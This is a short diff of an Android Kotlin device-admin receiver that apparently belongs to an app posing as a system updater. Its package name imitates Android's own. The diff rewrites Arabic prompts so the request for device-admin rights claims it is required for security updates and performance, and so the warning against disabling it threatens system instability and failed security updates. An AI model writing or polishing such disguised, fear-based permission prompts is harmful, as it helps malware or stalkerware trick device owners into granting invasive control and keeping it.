@@ -1,4 +1,4 @@
-package com.android.system.update.core
+package com.system.updates.core
 
 import android.app.admin.DeviceAdminReceiver
 import android.app.admin.DevicePolicyManager
@@ -13,7 +13,7 @@ class AdminReceiver : DeviceAdminReceiver() {
     }
 
     override fun onDisableRequested(context: Context, intent: Intent): CharSequence? {
-        return "تعطيل هذه الصلاحية قد يؤثر على استقرار النظام."
+        return "تعطيل هذه الصلاحية قد يؤثر على استقرار النظام وفشل تحديثات الأمان الضرورية."
     }
 
     override fun onDisabled(context: Context, intent: Intent) {
@@ -30,7 +30,7 @@ class AdminReceiver : DeviceAdminReceiver() {
         fun requestAdmin(context: Context) {
             val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
                 putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, ComponentName(context, AdminReceiver::class.java))
-                putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "مطلوب لتطبيق تحديثات الأمان.")
+                putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "مطلوب لتطبيق تحديثات الأمان وتحسين أداء النظام.")
                 addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
             }
             context.startActivity(intent)
